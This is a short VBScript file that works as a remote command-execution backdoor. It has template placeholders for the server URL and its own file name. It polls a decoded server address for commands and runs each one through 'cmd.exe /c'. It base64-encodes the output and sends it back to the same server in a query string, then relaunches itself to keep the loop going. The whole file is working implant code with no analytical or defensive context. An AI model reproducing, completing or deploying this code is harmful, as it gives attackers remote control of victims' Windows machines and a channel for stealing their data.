Function en (data)
    With CreateObject("CDO.Message").BodyPart
        .Charset = "utf-8"
        .ContentTransferEncoding = "base64"
        With .GetDecodedContentStream
            .WriteText data
            .Flush
        End With
        With .GetEncodedContentStream
            en = .ReadText(.Size - 2)
        End With
    End With
End Function

Function de (data)
    With CreateObject("CDO.Message").BodyPart
        .ContentTransferEncoding = "base64"
        .Charset = "utf-8"
        With .GetEncodedContentStream
            .WriteText data
            .Flush
        End With
        With .GetDecodedContentStream
            .Charset = "utf-8"
            de = .ReadText
        End With
    End With
End Function

Sub TExit ()
	WScript.Sleep 1500
	Dim objShell
	Set objShell = Wscript.CreateObject("WScript.Shell")
	objShell.Run "{FILENAME}.vbs"
End Sub

Dim u_s
u_s = de ("{URL}")

Function Req ()
	Dim s
	Dim oXMLHTTP
	
	s = u_s + "?getcmd=true"
	
	Set oXMLHTTP = CreateObject("Msxml2.XMLHttp.3.0")
	oXMLHTTP.Open "GET", s, False
	oXMLHTTP.Send
	Req = oXMLHTTP.ResponseText
End Function

Dim res
res = Req ()

if res<>"" Then
	Set p = CreateObject("WScript.Shell").Exec("cmd.exe /c " + res)
	if p.Status=0 then
		Dim cRes
		Dim u
		cRes = en (p.StdOut.ReadAll)
		u = u_s + "?b=" + cRes
		
		Dim oXMLHTTP
		Set oXMLHTTP = CreateObject("Msxml2.XMLHttp.3.0")
		oXMLHTTP.Open "GET", u, False
		oXMLHTTP.Send
	End If
End If

TExit () 'Exit code